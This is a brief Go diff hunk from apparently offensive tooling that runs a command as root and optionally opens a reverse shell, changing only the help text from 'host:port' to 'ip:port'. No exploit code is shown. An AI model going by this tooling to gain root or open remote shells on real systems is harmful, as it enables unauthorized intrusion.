@@ -8,7 +8,7 @@ import (
 func main() {
 	cmd := flag.String("c", "/bin/sh", "Command to execute as root")
 	greetings := flag.Bool("g", false, "Append id and greetings to your command")
-	reverseShell := flag.String("r", "", "Optionally open a reverse-shell instead. Format: host:port")
+	reverseShell := flag.String("r", "", "Optionally open a reverse-shell instead. Format: ip:port")
 	flag.Parse()
 
 	if *reverseShell != "" {
